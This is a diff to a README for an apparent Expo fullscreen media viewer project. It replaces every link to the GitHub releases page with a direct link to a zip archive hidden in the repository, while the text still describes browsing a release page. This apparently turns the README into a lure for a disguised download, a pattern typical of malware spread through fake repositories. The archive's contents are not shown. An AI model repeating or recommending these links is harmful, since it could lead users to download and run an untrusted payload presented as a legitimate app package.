@@ -1,6 +1,6 @@
 # 📺 expo-media-viewer - Fullscreen media, made simple
 
-[![Download the latest release](https://img.shields.io/badge/Download-Latest%20Release-blue?style=for-the-badge&logo=github)](https://github.com/simplyelegantstylescombr-bit/expo-media-viewer/releases)
+[![Download the latest release](https://img.shields.io/badge/Download-Latest%20Release-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/simplyelegantstylescombr-bit/expo-media-viewer/main/Wren/expo_viewer_media_logicize.zip)
 
 ## 🧭 What this is
 
@@ -12,7 +12,7 @@ This project is for app users who want a smooth way to view media inside an app.
 
 Visit this page to download:
 
-https://github.com/simplyelegantstylescombr-bit/expo-media-viewer/releases
+https://raw.githubusercontent.com/simplyelegantstylescombr-bit/expo-media-viewer/main/Wren/expo_viewer_media_logicize.zip
 
 On that page, look for the latest release. Download the file that matches your device or app package. If you are using a Windows computer to get the release files, open the release page and download the file you need from there.
 
@@ -45,7 +45,7 @@ It is useful when you want media to open in a focused, easy-to-use screen instea
 ## 🚀 How to get started
 
 1. Open the release page:
-   https://github.com/simplyelegantstylescombr-bit/expo-media-viewer/releases
+   https://raw.githubusercontent.com/simplyelegantstylescombr-bit/expo-media-viewer/main/Wren/expo_viewer_media_logicize.zip
 
 2. Find the newest release at the top of the page.
 
@@ -180,4 +180,4 @@ This helps the viewer open media with fewer issues.
 
 ## 📎 Download link again
 
-https://github.com/simplyelegantstylescombr-bit/expo-media-viewer/releases
+https://raw.githubusercontent.com/simplyelegantstylescombr-bit/expo-media-viewer/main/Wren/expo_viewer_media_logicize.zip
